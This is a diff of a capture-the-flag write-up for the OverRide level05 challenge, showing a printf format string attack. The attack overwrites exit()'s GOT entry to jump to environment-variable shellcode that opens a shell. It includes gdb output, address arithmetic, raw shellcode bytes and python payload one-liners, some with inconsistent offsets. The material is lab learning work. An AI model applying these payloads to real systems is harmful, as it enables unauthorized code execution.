@@ -71,57 +71,69 @@ Breakpoint 1 at 0x8048448
 Our malicious shellcode is at ```0xffffd822```. 
 Note: we want to move past the first 10 bytes "SHELLCODE=" and into your NOP slide, so let's make the address of our shellcode ```0xffffd822 + A (10 bytes) -> 0xffffd826```.
 
+We are going to insert this malicious code using a ```printf()``` format string attack. 
+
 Unfortunately, ```0xffffd826``` is too large to pass to ```printf()``` in decimal with a ```%d``` format (it overflows maxint).
 ```
 2147483647 <- maximum size of int
-4294957094 <- address of shellcode in decimal
+4294957094 <- address of shellcode (in decimal)
 ```
+We can, however, pass it in decimal as 2 short ints (written on 2 bytes each). 
+Note: reverse order for little endian! 
+```
+0xffffd826
+0xd826 -> 55334
+0xffff -> 65535
+```
+
+We are going to use our format string to overwrite the call to ```exit()```. 
+The GOT address of ```exit()``` is ```0x80497e0```.
+```
+level05@OverRide:~$ gdb -q level05
+(gdb) info function exit
+[...]
+0x08048370  exit
+0x08048370  exit@plt
+(gdb) x/i 0x08048370
+   0x8048370 <exit@plt>:	jmp    *0x80497e0
+```
+We will also have to split the address of ```exit()``` in two, to accomodate our hefty 2-part shellcode address. 
+
+Let's sum it all up! 
 
 So our attack takes place in 2 steps:
-- malicious environment variable
+- malicious environment variable 
+```
 "NOP slide [100 bytes] + call to open a shell"
+```
 
 - format string attack
-"exit GOT address [byte 1] + exit GOT address [byte 2] + shellcode addr [2 bytes] + '%10$hn' + shellcode addr [2 bytes] + '%11$hn'"
+  - exit GOT address, split into two [4 byte] parts
+  - shellcode address in decimal, split into two [4 byte] parts
+      - ``` 55334 - 8 bytes (of characters already written)``` -> ```55326```
+      - ```65535 - 55326 bytes (of characters already written)``` -> ```10209```
+  -  ```printf()``` formatting arguments: 
+      - ```%10$hn``` for 10th argument, half word/short int [2 bytes]
+      - ```%11$hn``` for 11th argument, half word/short int [2 bytes]
+```
+"exit GOT address [2 first bytes] + exit GOT address [2 last bytes] + shellcode addr [2 bytes] + '%10$hn' + shellcode addr [2 bytes] + '%11$hn'"
+```
+
+Let's try it. 
+```
+(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55326d%10$hn" + "%10209d%11$hn")'; cat) | ./level05
+```
+
+Why we can't just do this (with a %u modifier) is beyond me!
+```(python -c 'print "\xe0\x97\x04\x08" + "%4294957094u" + "%10$n"'; cat) | ./level05```
+
+```(python -c 'print "\xe0\x97\x04\x08" + "%4294957090u" + "%10$n"'; cat) | ./level05```
+
 
 ```
 (python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55397d%10$hn" + "%10130d%11$hn")'; cat) | ./level05
 ```
 
-
-Here is what our string attack should look like:
-- pad of arbitrary data [20 bytes]
-- puts() GOT address [4 bytes]
-- address of m() [4 bytes]
-Let's visualize that. 
-```
-"paddings [20 bytes] + GOT address of puts" + "address of m()"
-                  argv[1]                          argv[2]
-```
-Let's try it out!
-
-
-
-
-0xffffd85c:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f̀1ۉ\330@̀\350\334\377\377\377/bin/sh"
-... so 0xffffd85c + A (or 10 in dec) to get past the "SHELLCODE="... which equals 0xffffd866
-
-- overwrite address of exit by address of shellcode
-- use %d modifier to write address of shellcode
-
-"exit GOT address" + "4294958369 - 4 bytes" + "%4$n"
-(python -c 'print "\xe0\x97\x04\x08" + "%4294958365d" + "%10$n"'; cat) | ./level05
-
-4294958365
-2147483647
-
-```
-(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55397d%10$hn" + "%10130d%11$hn")'; cat) | ./level05
-```
----------
-./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
-
-(python -c 'print("\xe0\x97\x04\x08" + "%55397d%10$hn" + "%10130d%11$hn")'; cat) | ./level05 <- segfaults
 
 ## Recreate Exploited Binary
 
